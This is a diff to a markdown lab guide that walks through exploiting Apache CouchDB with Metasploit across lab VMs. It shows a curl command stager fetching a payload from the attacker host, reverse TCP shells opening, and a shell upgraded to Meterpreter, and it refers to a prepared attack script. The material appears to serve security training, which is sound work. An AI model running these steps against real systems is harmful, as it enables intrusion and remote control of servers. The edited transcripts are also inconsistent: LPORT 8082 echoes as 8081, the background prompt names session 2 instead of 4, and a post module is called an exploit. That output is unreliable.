@@ -607,7 +607,7 @@ msf5 exploit(linux/http/apache_couchdb_cmd_exec) > exploit
     * Type **background** to move the shell session to the background. Confirm by entering **y**
     * Type **use multi/manage/shell_to_meterpreter** to select the CouchDB Command Execution exploit module
     * Type **set LPORT 8081** to define the local port to use. The reverse shell will be established to this local port
-    * Type **set session 2** to indicate the reverse command shell session from **App1-WEB-APP VM** is the one we want to upgrade
+    * Type **set session 2** to indicate the reverse command shell session from **App1-APP-TIER VM** is the one we want to upgrade
     * Type **exploit** to establish the session
 
 ```console
@@ -702,22 +702,39 @@ msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set LPORT 4445
 LPORT => 4445
 msf5 exploit(linux/http/apache_couchdb_cmd_exec) > exploit
 ```
-2. Confirm the vulnerable server was sucessfully exploited and a **shell** reverse TCP session was established from **App1-APP-TIER VM** back to the **Extermal VM**
-```console
-[*] Started reverse TCP handler on 10.114.209.151:4445
+2. Confirm the vulnerable server was sucessfully exploited and a **shell** reverse TCP session was established from **App2-APP-TIER VM** back to the **Extermal VM**
+```console2
+[*] Started reverse TCP handler on 10.114.209.151:4446
 [*] Generating curl command stager
-[*] Using URL: http://0.0.0.0:8080/l8sEqcccZNK
-[*] Local IP: http://10.114.209.151:8080/l8sEqcccZNK
-[*] 192.168.20.100:5984 - The 1 time to exploit
-[*] Client 10.114.209.148 (curl/7.38.0) requested /l8sEqcccZNK
+[*] Using URL: http://0.0.0.0:8080/GAFpUcHbTSn8hBi
+[*] Local IP: http://10.114.209.151:8080/GAFpUcHbTSn8hBi
+[*] 192.168.20.101:5984 - The 1 time to exploit
+[*] Client 10.114.209.148 (curl/7.38.0) requested /GAFpUcHbTSn8hBi
 [*] Sending payload to 10.114.209.148 (curl/7.38.0)
-[*] Command shell session 2 opened (10.114.209.151:4445 -> 10.114.209.148:50665) at 2020-07-22 08:48:51 -0500
-[+] Deleted /tmp/jekukcmc
-[+] Deleted /tmp/okmyzfondlujy
-[*] Server stopped.
+[*] Command shell session 4 opened (10.114.209.151:4446 -> 10.114.209.148:31532) at 2020-07-22 11:29:30 -0500
+[+] Deleted /tmp/phfyklia
+[+] Deleted /tmp/xhvxgpbjttxvgccd
 ```
-
-
+3. You can now also upgrade this shell to Meterpreter, by running the below commands 
+    * Type **background** to move the shell session to the background. Confirm by entering **y**
+    * Type **use multi/manage/shell_to_meterpreter** to select the CouchDB Command Execution exploit module
+    * Type **set LPORT 8082** to define the local port to use. The reverse shell will be established to this local port
+    * Type **set session 4** to indicate the reverse command shell session from **App2-APP-TIER VM** is the one we want to upgrade
+    * Type **exploit** to establish the session
+```console
+background
+Background session 2? [y/N]  y
+msf5 exploit(linux/http/apache_couchdb_cmd_exec) > use multi/manage/shell_to_meterpreter
+msf5 post(multi/manage/shell_to_meterpreter) > set LPORT 8082
+LPORT => 8081
+msf5 post(multi/manage/shell_to_meterpreter) > set session 4
+session => 4
+msf5 post(multi/manage/shell_to_meterpreter) > exploit
+```
+4. You can now interact with the Meterpreter session. For instance, you can run the below commands to gain more inforation on the exploited **App2-APP-TIER VM**
+    * Type **sessions -l** to see all established sessions
+```console
+msf5 post(multi/manage/shell_to_meterpreter) > sessions -l
 
 
 If you prefer not to manually go through this attack scenario, using the below steps, you can instead run the pre-defined attack script by running **sudo ./attack2.sh**. Before you execute the script, use **sudo nano attack1.rc** and replace the RHOST and LHOST IP addresses accordingly to match with the IP addresses in your environment. 
